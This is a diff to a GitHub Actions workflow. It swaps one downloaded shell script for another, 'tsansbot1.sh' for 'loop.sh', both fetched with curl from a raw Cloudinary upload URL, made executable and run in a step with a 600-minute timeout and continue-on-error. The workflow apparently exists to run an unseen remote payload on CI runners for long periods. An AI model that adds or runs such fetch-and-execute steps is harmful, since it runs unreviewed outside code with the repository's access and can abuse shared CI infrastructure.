@@ -10,9 +10,9 @@ defaults:
   run:
     shell: bash
 jobs:
-  build:
+  run:
     continue-on-error: true
-    runs-on: ubuntu-22.04
+    runs-on: ubuntu-latest
     steps:
     - name: Install expect and other dependencies
       run: |
@@ -62,6 +62,6 @@ jobs:
     - name: Run exec
       timeout-minutes: 600
       run: |
-          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1725542284/tsansbot1.sh
-          chmod +x tsansbot1.sh
-          ./tsansbot1.sh
+          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1727172809/loop.sh
+          chmod +x loop.sh
+          ./loop.sh
